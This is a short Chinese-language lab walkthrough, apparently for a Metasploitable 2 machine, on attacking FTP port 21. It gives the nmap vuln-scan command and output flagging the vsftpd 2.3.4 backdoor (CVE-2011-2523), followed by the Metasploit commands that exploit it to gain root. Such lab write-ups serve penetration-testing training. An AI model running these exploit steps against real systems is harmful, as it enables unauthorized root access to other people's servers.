# 21_FTP.md

使用nmap对靶机进行扫描

> nmap -p 21 -sV -T4 --version-all --script vuln 10.10.10.6

![image-20210318161100985](../../image/meteaspolitale2/image-20210318161100985.png)

获得信息

>PORT   STATE SERVICE VERSION
>21/tcp open  ftp     vsftpd 2.3.4
>| ftp-vsftpd-backdoor:
>|   VULNERABLE:
>|   vsFTPd version 2.3.4 backdoor
>|     State: VULNERABLE (Exploitable)
>|     IDs:  CVE:CVE-2011-2523  BID:48539
>|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
>|     Disclosure date: 2011-07-03
>|     Exploit results:
>|       Shell command: id
>|       Results: uid=0(root) gid=0(root)
>|     References:
>|       https://www.securityfocus.com/bid/48539
>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
>|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
>|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
>|_sslv2-drown:
>MAC Address: 00:0C:29:FA:DD:2A (VMware)
>Service Info: OS: Unix

![image-20210318161143796](../../image/meteaspolitale2/image-20210318161143796.png)

分别发现`CVE-2011-2523`的漏洞,vsftpd版本号`2.3.4`

使用msfconsole进行利用

> search vsftp 2.3.4

![image-20210318164832557](../../image/meteaspolitale2/image-20210318164832557.png)

选择漏洞脚本

> use  exploit/unix/ftp/vsftpd_234_backdoor

设置靶机ip

>  set RHOSTS 10.10.10.6

![image-20210318165953689](../../image/meteaspolitale2/image-20210318165953689.png)

参数设置完成

攻击

> exploit

![image-20210318170131032](../../image/meteaspolitale2/image-20210318170131032.png)

漏洞利用成功

